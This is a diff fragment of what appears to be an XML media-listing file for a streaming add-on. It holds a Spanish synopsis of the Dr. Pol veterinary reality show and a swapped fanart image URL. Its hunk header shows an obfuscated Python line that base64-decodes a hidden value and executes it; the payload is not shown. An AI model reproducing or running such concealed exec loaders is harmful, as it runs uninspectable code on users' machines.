@@ -95,7 +95,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 </regex>
 <info>El doctor Jan Pol ha practicado la veterinaria por más de la mitad de su vida. En 1981, él y su esposa, Diane, abrieron el negocio veterinario en su casa , y durante los años ha crecido para servir a más de 19000 clientes. Ubicada en una finca en el área rural de Michigan Central. Esta serie de la vida real sigue al Dr. Pol y el trabajo que hace en el "Pol Veterinary Services" que se especializa en animales grandes de granjas, el doctor Pol atiende a caballos, cerdos, vacas, ovejas, alpacas, cabras, pollos y hasta venados en ocasiones. El programa también muestra a la Dra. Brenda Grettenberger, quien ha trabajado con el Dr Pol desde 1992.</info>
 <thumbnail>https://i.imgur.com/THF5G4e.jpg</thumbnail>
-<fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
+<fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
 </item>
 
 
